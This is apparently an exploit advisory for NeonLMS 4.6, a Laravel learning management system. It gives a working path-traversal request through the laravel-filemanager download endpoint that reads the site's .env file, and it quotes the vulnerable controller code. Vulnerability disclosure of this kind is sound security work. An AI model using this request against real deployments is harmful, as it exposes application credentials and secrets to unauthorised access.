@@ -1,0 +1,34 @@
+
+# Exploit Title: NeonLMS - Learning Management System PHP Laravel Script - 'Arbitrary' File Download
+# Exploit Author: th3d1gger
+# Google Dork: N/A
+# Type: Web App
+# Date: 2020-06-04
+# Vendor Homepage: https://www.neonlms.com/
+# Software Link: https://codecanyon.net/item/neonlms-learning-management-system-php-laravel-script/23641351
+# Affected Version: 4.6 
+# Tested on: Windows
+# CVE : N/A
+
+#Vulnerable Request:
+After Authentication as student,
+browse https://neonlmshost/laravel-filemanager/download?file=/../../../.env
+
+#Vulnerable code
+
+
+
+\vendor\unisharp\laravel-filemanager\src\Controllers\DownloadController.php
+
+    public function getDownload()
+    {
+
+
+            return response()->download(parent::getCurrentPath(request('file')));
+
+
+    }
+
+#fix
+maybe devteam can use "auth user role check" in that function.
+or can update it.
